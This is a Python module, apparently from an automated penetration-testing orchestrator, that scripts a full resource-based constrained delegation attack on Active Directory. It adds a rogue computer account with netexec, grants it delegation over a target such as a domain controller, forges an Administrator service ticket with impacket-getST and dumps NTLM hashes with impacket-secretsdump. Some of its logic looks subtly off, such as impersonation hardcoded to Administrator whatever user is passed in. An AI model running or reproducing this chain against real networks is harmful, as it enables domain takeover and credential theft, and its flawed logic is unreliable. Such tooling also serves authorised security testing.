import logging, re, shlex

from orchestrator.kali_tools_client import kali

logger = logging.getLogger("ad_rbcd")


class RBCD:
    async def add_computer(self, target: str, computer_name: str,
                            username: str, password: str,
                            domain: str = "", dc_ip: str = "",
                            timeout: int = 120) -> dict:
        """Add a computer account (needed for RBCD attack)."""
        args = f"ldap {shlex.quote(target)} -u {shlex.quote(username)} -p {shlex.quote(password)}"
        if domain:
            args += f" -d {domain}"
        if dc_ip:
            args += f" --dc-ip {dc_ip}"
        args += f" -M add-computer -o COMPUTER={computer_name}"

        result = await kali.run("netexec", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        success = "successfully" in stdout.lower() or "added" in stdout.lower()
        return {
            "success": success,
            "computer": computer_name,
            "output": stdout[:3000],
            "error": result.get("stderr", "")[:1000] if not success else "",
        }

    async def delegate(self, target: str, computer: str, delegate_to: str,
                       username: str, password: str = "",
                       hash: str = "", domain: str = "",
                       dc_ip: str = "", timeout: int = 120) -> dict:
        """
        Set RBCD on delegate_to so that computer can impersonate any user to it.
        delegate_to: target computer to receive delegation rights (e.g. DC01$)
        computer: attacker-controlled computer account
        """
        auth = f"-u {shlex.quote(username)}"
        auth += f" -p {shlex.quote(password)}" if password else f" -H {shlex.quote(hash)}"
        args = f"ldap {target} {auth}"
        if domain:
            args += f" -d {domain}"
        args += f" -M rbcd -o COMPUTER={computer} -o DELEGATE={delegate_to}"
        if dc_ip:
            args += f" --dc-ip {dc_ip}"

        result = await kali.run("netexec", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        success = "successfully" in stdout.lower() or "modified" in stdout.lower()
        return {
            "success": success,
            "computer": computer,
            "delegate_to": delegate_to,
            "output": stdout[:3000],
            "error": result.get("stderr", "")[:1000] if not success else "",
        }

    async def exploit(self, target: str, delegate_to: str,
                      attacker_computer: str, attacker_password: str,
                      target_user: str = "Administrator",
                      username: str = "", password: str = "",
                      domain: str = "", dc_ip: str = "",
                      timeout: int = 120) -> dict:
        """
        Full RBCD: add computer → set delegation → request TGS → get hash.
        """
        results = {}
        add_result = await self.add_computer(
            target, attacker_computer, username, password,
            domain=domain, dc_ip=dc_ip, timeout=timeout)
        results["add_computer"] = add_result

        if add_result["success"]:
            del_result = await self.delegate(
                target, attacker_computer, delegate_to,
                username, password=password,
                domain=domain, dc_ip=dc_ip, timeout=timeout)
            results["set_delegation"] = del_result

            if del_result["success"]:
                # Request TGS via Impacket getST
                getst_args = f"{domain}/{target_user}@{delegate_to} -impersonate Administrator -dc-ip {dc_ip or target}"
                getst_args += f" -hashes :{shlex.quote(attacker_password)}" if ":" in attacker_password else f" -aesKey {shlex.quote(attacker_password)}"
                tgs_result = await kali.run("impacket-getST", getst_args, timeout=timeout)
                stdout = (tgs_result.get("stdout") or "") + (tgs_result.get("stderr") or "")
                results["get_tgs"] = {
                    "success": "saved" in stdout.lower() or ".ccache" in stdout,
                    "output": stdout[:3000],
                }

                if results["get_tgs"]["success"]:
                    dcsync_args = f"{domain}/{target_user}@{delegate_to} -k -no-pass -dc-ip {dc_ip or target}"
                    dcsync_result = await kali.run("impacket-secretsdump", dcsync_args, timeout=300)
                    stdout = (dcsync_result.get("stdout") or "") + (dcsync_result.get("stderr") or "")
                    hashes = re.findall(r'(\w+:\d+:\w{32}:\w{32}:::)', stdout)
                    results["dcsync"] = {
                        "success": len(hashes) > 0,
                        "hashes": hashes[:10],
                        "output": stdout[:3000],
                    }

        return results
